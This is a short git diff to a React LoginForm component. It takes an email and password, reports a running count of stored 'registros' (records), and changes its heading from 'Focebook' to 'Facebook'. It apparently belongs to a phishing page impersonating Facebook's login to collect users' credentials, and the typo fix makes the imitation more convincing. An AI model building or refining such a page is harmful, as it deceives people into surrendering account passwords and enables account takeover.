@@ -23,11 +23,11 @@ export default function LoginForm() {
       const data = await response.json()
 
       if (data.success) {
-        alert(`R ${data.totalRegistros}`)
+        alert(` ${data.totalRegistros}`)
         setEmail("")
         setPassword("")
       } else {
-        alert(`r ${data.error}`)
+        alert(` ${data.error}`)
       }
     } catch (error) {
       alert('❌ Error de conexión')
@@ -43,7 +43,7 @@ export default function LoginForm() {
       </div>
 
       <div className="bg-white rounded-lg shadow-lg p-8">
-        <h2 className="text-2xl font-semibold text-gray-900 mb-6 text-center">Log In to Focebook</h2>
+        <h2 className="text-2xl font-semibold text-gray-900 mb-6 text-center">Log In to Facebook</h2>
 
         <form onSubmit={handleSubmit} className="space-y-4">
           <div>
